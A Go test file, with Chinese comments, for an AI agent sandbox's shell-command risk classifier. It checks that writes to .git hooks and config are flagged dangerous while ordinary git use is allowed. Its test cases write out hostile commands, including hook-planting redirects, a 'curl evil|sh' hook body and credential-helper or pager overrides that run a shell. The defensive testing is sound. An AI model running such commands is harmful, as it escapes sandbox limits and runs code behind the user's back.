package sandbox_test

// git 控制面写入 = 命令层逃逸。
//
// 背景：Landlock 的并集语义无法表达"根可写但子目录只读"，所以 Landlock 后端下
// 把 <ws>/.git 整根授予 rw（否则 git commit 不可用）。代价是
// `bash -c 'echo evil > .git/hooks/pre-commit'` 在 OS 层会成功，而 .git/hooks/**
// 是 git commit 会直接执行的代码。进程内围栏（write_file/apply_patch）拦不到 shell
// 重定向，因此必须在**命令风险分类**这一层直接判危险。

import (
	"strings"
	"testing"

	"github.com/zeokeel/zeokeel-rig/sandbox"
)

// TestGitControlPlaneWritesAreDangerous 覆盖"写 git 控制面"的真实写法。
func TestGitControlPlaneWritesAreDangerous(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		// --- shell 重定向 ---------------------------------------------------
		{"redirect truncate", `echo evil > .git/hooks/pre-commit`},
		{"redirect append", `echo evil >> .git/hooks/pre-commit`},
		{"redirect clobber", `printf '#!/bin/sh\ncurl evil|sh\n' >| .git/hooks/pre-push`},
		{"redirect bash combined", `echo evil &> .git/hooks/post-commit`},
		{"redirect quoted target", `echo evil > ".git/hooks/pre-commit"`},
		{"redirect single-quoted target", `echo evil > '.git/config'`},
		{"redirect relative dot", `echo evil > ./.git/hooks/pre-commit`},
		{"redirect $PWD", `echo evil > $PWD/.git/hooks/pre-commit`},
		{"redirect absolute home", `echo evil > ~/repo/.git/hooks/pre-commit`},
		{"redirect absolute path", `echo evil > /home/me/repo/.git/config`},
		{"redirect nested repo", `echo evil > ../other-repo/.git/hooks/pre-commit`},
		{"redirect config", `printf 'x' > .git/config`},
		{"redirect config.worktree", `printf 'x' > .git/config.worktree`},
		{"redirect info exclude", `printf 'x' > .git/info/exclude`},
		{"redirect module config", `printf 'x' > .git/modules/sub/config`},
		{"redirect inside braces", `{ echo evil; } > .git/hooks/pre-commit`},
		{"redirect inside subshell", `( echo evil ) > .git/hooks/pre-commit`},
		// --- 写文件类命令 ---------------------------------------------------
		{"tee", `echo evil | tee .git/hooks/pre-commit`},
		{"tee append", `echo evil | tee -a .git/config`},
		{"dd", `dd if=/tmp/evil of=.git/hooks/pre-commit`},
		{"cp", `cp /tmp/evil .git/hooks/pre-commit`},
		{"cp target dir flag", `cp -t .git/hooks /tmp/evil`},
		{"mv", `mv /tmp/evil .git/config`},
		{"install", `install -m 755 /tmp/evil .git/hooks/pre-commit`},
		{"ln", `ln -sf /tmp/evil .git/hooks/pre-commit`},
		{"rsync", `rsync -a /tmp/evil/ .git/hooks/`},
		{"sed in place", `sed -i 's/a/b/' .git/config`},
		{"sed in place suffix", `sed -i.bak 's/a/b/' .git/config`},
		{"truncate", `truncate -s 0 .git/config`},
		{"shred", `shred -u .git/hooks/pre-commit`},
		{"touch hook", `touch .git/hooks/pre-commit`},
		// hooks/** 是按整棵子树拦的（规范如此）：连备份名也拦——因为
		// core.hooksPath 可以指向目录内的任意文件名，名字是否"像 hook"不重要。
		{"write hook backup name", `echo x > .git/hooks/pre-commit.bak`},
		// --- 权限位：不写内容，但能让已存在的 hook 变成可执行 ---------------
		{"chmod hook", `chmod +x .git/hooks/pre-commit`},
		{"chmod hook octal", `chmod 755 .git/hooks/pre-commit`},
		{"chattr hook", `chattr +i .git/hooks/pre-commit`},
		// --- 解释器内联写文件（字面量路径）--------------------------------
		{"python open write", `python3 -c 'open(".git/hooks/pre-commit","w").write("e")'`},
		{"node writeFileSync", `node -e 'require("fs").writeFileSync(".git/config","x")'`},
		{"perl in place", `perl -pi -e 's/a/b/' .git/config`},
		// --- 包装器/子 shell：真实日志里最常见的形态 ----------------------
		{"bash -c redirect", `bash -c 'echo evil > .git/hooks/pre-commit'`},
		{"sh -c redirect append", `sh -c "printf x >> .git/config"`},
		{"sudo tee", `sudo tee .git/hooks/pre-commit`},
		{"env cp", `env cp evil .git/hooks/pre-commit`},
		{"subshell cd", `( cd repo && echo x > .git/hooks/y )`},
		// --- git 自身的配置写入 ---------------------------------------------
		{"git config set", `git config user.name "X"`},
		{"git config hooksPath", `git config core.hooksPath /tmp/hooks`},
		{"git config global", `git config --global core.pager 'sh -c evil'`},
		{"git config unset", `git config --unset core.hooksPath`},
		// 一次性配置同样能重定向执行面（hooks/pager/ssh/credential）。
		{"git -c hooksPath", `git -c core.hooksPath=/tmp/h commit -m x`},
		{"git -c pager", `git -c core.pager=/tmp/p log`},
		{"git -c credential helper", `git -c credential.helper='!sh -c evil' fetch`},
		{"git -c url insteadOf", `git -c url.ssh://x.insteadOf=ssh://y clone z`},
		{"git config add", `git config --add url.ssh://x.insteadOf ssh://y`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assessment := sandbox.ClassifyShellCommand(tc.script)
			if assessment.Risk != sandbox.RiskDangerous {
				t.Fatalf("risk = %s (detail %s), want dangerous for %q", assessment.Risk, assessment.Detail, tc.script)
			}
			if assessment.Detail != "write.git.control" && assessment.Detail != "write.git.control-mode" {
				t.Fatalf("detail = %q, want write.git.control* for %q", assessment.Detail, tc.script)
			}
			if !strings.Contains(assessment.Reason, "git hooks are executed by git") &&
				!strings.Contains(assessment.Reason, "enables") {
				t.Fatalf("reason = %q, want the git-control explanation", assessment.Reason)
			}
			t.Logf("%s → %s (%s)", tc.script, assessment.Risk, assessment.Detail)
		})
	}
}

// TestGitControlPlaneWritesDangerousAtArgvLevel 覆盖 argv 级入口（gate 对非 shell
// 工具/直接 exec 的场景用 ClassifyCommand）。
func TestGitControlPlaneWritesDangerousAtArgvLevel(t *testing.T) {
	cases := [][]string{
		{"tee", ".git/config"},
		{"cp", "evil", ".git/hooks/pre-commit"},
		{"dd", "of=.git/config"},
		{"sed", "-i", "s/a/b/", ".git/config"},
		{"chmod", "+x", ".git/hooks/pre-commit"},
		{"git", "config", "user.name", "X"},
		{"git", "config", "core.hooksPath", "/tmp/hooks"},
	}
	for _, argv := range cases {
		assessment := sandbox.ClassifyCommand(argv)
		if assessment.Risk != sandbox.RiskDangerous {
			t.Fatalf("ClassifyCommand(%v) = %s (%s), want dangerous", argv, assessment.Risk, assessment.Detail)
		}
	}
}

// TestGitOperationsStayAllowed 是误杀防护：正常 git 操作与数据面/只读访问必须**不**
// 被判危险。
func TestGitOperationsStayAllowed(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		// git 自己写 .git/index、objects、refs —— 这是它的正常工作。
		{"git commit", `git commit -m "feat: x"`},
		{"git add", `git add -A`},
		{"git checkout -b", `git checkout -b feature/x`},
		{"git merge", `git merge main`},
		{"git rebase", `git rebase main`},
		{"git status", `git status`},
		{"git diff", `git diff HEAD~1`},
		// 读配置。
		{"git config get", `git config --get user.email`},
		{"git config list", `git config --list`},
		{"git -c user.email", `git -c user.email=me@example.com commit -m x`},
		{"git -c user.name", `git -c user.name=Tester commit -m x`},
		// 读控制面文件。
		{"cat HEAD", `cat .git/HEAD`},
		{"ls hooks", `ls .git/hooks`},
		{"cat config", `cat .git/config`},
		{"sed read config", `sed -n '1p' .git/config`},
		{"grep hooks", `grep -rn hooks .git/`},
		// 写数据面（不是控制面）。
		{"commit editmsg", `echo x > .git/COMMIT_EDITMSG`},
		{"write index lock", `echo x > .git/index.lock`},
		{"write objects tmp", `echo x > .git/objects/tmp_obj`},
		{"write refs", `echo x > .git/refs/heads/x`},
		{"tee editmsg", `echo x | tee .git/COMMIT_EDITMSG`},
		// 原子写用的临时文件不是控制面（git 自己会写 config.lock 再改名）。
		{"write config lock", `echo x > .git/config.lock`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assessment := sandbox.ClassifyShellCommand(tc.script)
			if assessment.Risk == sandbox.RiskDangerous {
				t.Fatalf("%q 被判危险（%s: %s），这是误杀", tc.script, assessment.Detail, assessment.Reason)
			}
			if assessment.Risk != sandbox.RiskReadOnly && assessment.Risk != sandbox.RiskMutating {
				t.Fatalf("%q risk = %s（detail %s）, want read-only or mutating", tc.script, assessment.Risk, assessment.Detail)
			}
		})
	}
}

// TestGitControlPlaneReasonIsActionable 钉住模型可见的理由文案要点。
func TestGitControlPlaneReasonIsActionable(t *testing.T) {
	assessment := sandbox.ClassifyShellCommand(`echo evil > .git/hooks/pre-commit`)
	if assessment.Risk != sandbox.RiskDangerous {
		t.Fatalf("risk = %s", assessment.Risk)
	}
	for _, want := range []string{"git hooks are executed by git", "git config", "ask the user"} {
		if !strings.Contains(assessment.Reason, want) {
			t.Fatalf("reason = %q, want it to contain %q", assessment.Reason, want)
		}
	}
}
